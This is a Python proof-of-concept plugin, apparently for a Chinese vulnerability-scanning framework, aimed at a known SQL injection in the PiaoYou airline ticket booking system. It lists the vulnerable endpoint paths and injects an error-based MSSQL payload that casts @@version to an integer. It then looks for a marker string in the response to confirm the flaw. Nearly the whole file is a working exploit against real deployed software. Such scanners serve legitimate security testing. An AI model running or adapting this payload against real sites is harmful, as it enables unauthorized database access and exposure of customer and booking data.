# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'PiaoYou_0006'  # 平台漏洞编号，留空
    name = '票友机票预订系统通用SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-10'  # 漏洞公布时间
    desc = '''
        票友软件是一款用于航空票务代理专用机票管理系统，集成网上订票管理、电话录音弹屏、企业差旅管理、同业订单管理、会员管理、积分管理、短信发送、员工管理、报表生成、财务管理等强大功能，广泛应用于有各航空票务代理人及航空售票点，帮助您提高工作效率，迅速了解客户的需求，极大提高业务成交量，提升客户满意度，协助您在激烈的市场竞争中脱颖而出。
        票友机票预订系统多处通用SQL注入漏洞：
        "/ser_Hotel/SearchList.aspx?CityCode=1%27",
        "/visa/visa_view.aspx?a=11",
        "/travel/Default.aspx?leixing=11",
        "/hotel/Default.aspx?s=11",
        "/travel/Default.aspx?ecity=%E4%B8%8A%E6%B5%B7&leixing=11",
        "/hotel/Default.aspx?s=11", 
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0118867'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PiaoYou(票友软件)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'aa1d9bd8-49ed-41ba-951b-bf7c77611295'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
                "/ser_Hotel/SearchList.aspx?CityCode=1%27",
                "/visa/visa_view.aspx?a=11",
                "/travel/Default.aspx?leixing=11",
                "/hotel/Default.aspx?s=11",
                "/travel/Default.aspx?ecity=%E4%B8%8A%E6%B5%B7&leixing=11",
                "/hotel/Default.aspx?s=11",
            ]
            for url in urls:
                vul = arg + url + \
                    "%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--"
                code, head, res, errcode, _ = hh.http(vul)
                if code != 0 and 'WtFaBcMic' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=vul))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
